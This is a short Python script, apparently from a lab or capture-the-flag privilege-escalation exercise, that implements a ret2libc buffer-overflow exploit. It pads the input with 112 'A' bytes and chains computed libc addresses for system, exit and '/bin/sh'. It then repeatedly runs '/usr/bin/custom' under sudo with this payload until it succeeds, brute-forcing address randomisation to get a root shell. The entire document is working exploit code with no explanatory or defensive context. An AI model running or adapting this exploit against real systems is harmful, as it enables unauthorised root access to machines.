#!/usr/bin/python3

import subprocess
from struct import pack
import sys

offset = 112
junk = b"A"*offset

# ret2libc_addr
libc_addr = 0xb7dd8000
# offsets
sys_offset = 0x0003adb0
exit_offset = 0x0002e9e0
shell_offset = 0x0015bb2b
# real 'system' address = ret2lic address + 'system' offset
sys_addr = pack("<L", libc_addr + sys_offset)
# real 'exit' address = ret2lic address + 'exit' offset
exit_addr = pack("<L", libc_addr + exit_offset)
# real '/bin/sh' address = ret2lic address + '/bin/sh' offset
shell_addr = pack("<L", libc_addr + shell_offset)

payload = junk + sys_addr + exit_addr + shell_addr

while True:
        result = subprocess.run(["sudo", "/usr/bin/custom", payload])
        if result.returncode == 0:
                print("Success!")
                sys.exit(0)

